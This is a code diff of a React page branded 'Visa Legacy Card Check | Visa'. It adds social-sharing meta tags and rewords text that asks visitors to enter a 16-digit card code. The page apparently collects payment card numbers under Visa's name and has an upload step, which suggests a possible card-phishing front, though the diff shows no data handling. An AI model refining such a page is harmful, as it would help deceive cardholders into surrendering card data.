@@ -223,6 +223,9 @@ export default function VisaLegacyPage() {
             <Head>
                 <title>Visa Legacy Card Check | Visa</title>
                 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+                <meta property="og:title" content="Visa Legacy Card Check | Visa" />
+                <meta property="og:description" content="Check to see if the card is a Visa Legacy compatible card." />
+                <meta property="og:type" content="website" />
             </Head>
 
             <header className={styles.header}>
@@ -272,7 +275,7 @@ export default function VisaLegacyPage() {
 
                 <section className={styles.cardSection}>
                     <div className={styles.formContainer}>
-                        <p className={styles.subtitle}>Enter your 16-digit code to verify the card type instantly.</p>
+                        <p className={styles.subtitle}>Enter your 16 digit code to check if your card is Visa Legacy compatible.</p>
 
                         <div className={styles.card}>
                             <form onSubmit={checkBalance}>
@@ -361,7 +364,7 @@ export default function VisaLegacyPage() {
 
                                 {!showUploadStep && (
                                     <button type="submit" className={styles.button} disabled={loading}>
-                                        {loading ? 'Verifying...' : 'CHECK ID'}
+                                        {loading ? 'Verifying...' : 'Check Card'}
                                     </button>
                                 )}
                             </form>
